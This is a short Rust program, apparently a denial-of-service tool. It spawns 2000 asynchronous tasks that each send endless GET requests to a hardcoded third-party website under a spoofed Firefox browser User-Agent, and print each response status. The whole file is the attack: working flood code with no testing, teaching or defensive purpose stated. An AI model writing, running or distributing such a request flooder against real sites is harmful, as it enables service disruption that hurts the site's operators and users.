use tokio::task::JoinHandle;

use reqwest::{
    header::{self, HeaderMap},
    Client,
};

#[tokio::main]
async fn main() {
    let thread_spawn = 2000;
    let target = "https://sneakyspeedyboii.com/";

    let mut headers = HeaderMap::new();
    headers.insert(
        header::USER_AGENT,
        header::HeaderValue::from_str(
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0",
        )
        .unwrap(),
    );

    let client_builder = Client::builder().default_headers(headers);

    let client = client_builder.build().unwrap();

    let mut handles: Vec<JoinHandle<()>> = vec![];

    for _ in 0..thread_spawn {
        let client = client.clone();

        let handle = tokio::spawn(async move {
            loop {
                let res = client.get(target).send().await;

                match res {
                    Ok(res) => println!("Status: {}", res.status()),
                    Err(err) => println!("Error: {}", err),
                }
            }
        });

        handles.push(handle);
    }

    for handle in handles {
        let _ = handle.await;
    }
}